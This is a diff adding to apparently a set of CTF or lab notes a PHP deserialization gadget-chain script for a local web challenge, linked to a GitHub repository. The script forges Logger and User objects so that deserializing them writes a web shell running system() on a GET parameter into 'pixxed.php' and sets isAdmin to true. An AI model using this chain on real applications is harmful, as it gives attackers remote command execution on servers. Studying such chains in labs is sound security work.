@@ -280,6 +280,45 @@ $property->setValue($trigger,$echoers);
 echo base64_encode(serialize($trigger));
 ?>
 ```
+--------------
+
+### Local Challenge created by someone
+
+-------------
+
+- Chain-:
+
+```php
+<?php
+require('includes\bootstrap.php');
+$gadgetuser =  new User('<?php `$_GET["die"]`;?>','supersecret');
+$gadgetlogger  =  new Logger;
+
+//setting up gadget Logger
+
+$logger = new Logger;
+$reflection =  new \ReflectionClass($gadgetlogger);
+$property =  $reflection->getProperty("logFile");
+$property->setAccessible(true);
+$property->setValue($logger,'pixxed.php');
+$property = $reflection->getProperty('logData');
+$property->setAccessible(true);
+$property->setValue($logger,['<?php system($_GET["die"]);?>']);
+//setting up gadget  user
+$user =  new User('`ls`','supersecret');
+$reflection =  new \ReflectionClass($gadgetuser);
+$property =  $reflection->getProperty('isAdmin');
+$property->setAccessible(true);
+$property->setValue($user,true);
+//setting logger private data
+$property = $reflection->getProperty('logger');
+$property->setAccessible(true);
+$property->setValue($user,$logger);
+echo base64_encode(serialize($user));
+?>
+```
+
+- [Source Code](https://github.com/HeavyGhost-le/PHP_deserialization_web_chall.git)
 
 ---------------
 
